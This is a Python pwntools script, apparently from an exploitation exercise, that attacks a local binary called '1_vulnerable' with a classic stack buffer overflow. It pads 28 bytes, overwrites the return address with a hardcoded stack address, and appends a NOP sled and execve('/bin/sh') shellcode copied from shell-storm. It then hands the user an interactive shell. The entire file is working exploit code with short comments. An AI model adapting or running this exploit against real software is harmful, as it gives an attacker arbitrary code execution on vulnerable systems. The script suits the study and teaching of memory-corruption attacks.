#!/usr/bin/python
from pwn import * 

def main():
	# start a process
	p = process("./1_vulnerable")

	# gdb-peda$ pattern_offset 0x413b4141
	# 1094402369 found at offset: 28

	# create payload
	# ret_address = 0x41424344
	ret_address = 0xffffd5c0 + 28 + 4 

	# http://shell-storm.org/shellcode/files/shellcode-811.php
	# execve("/bin/sh")
	# shellcode = 28 bytes
	shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73"
	shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
	shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
	shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80"

	payload = 'A' * 28 + p32(ret_address) # overflow buffer and jump to address after return address

	# for `nop`
	# padding_len = 100 - 32 - 28 = 40
	padding_len = 100 - len(payload) - len(shellcode)

	# payload = payload.ljust(100, "\xcc")
	payload += "\x90" * padding_len + shellcode

	# print the process id
	# raw_input(str(p.proc.pid))

	# send the payload to the binary
	p.send(payload)

	# pass interaction back to the user
	p.interactive()

if __name__ == "__main__":
	main()
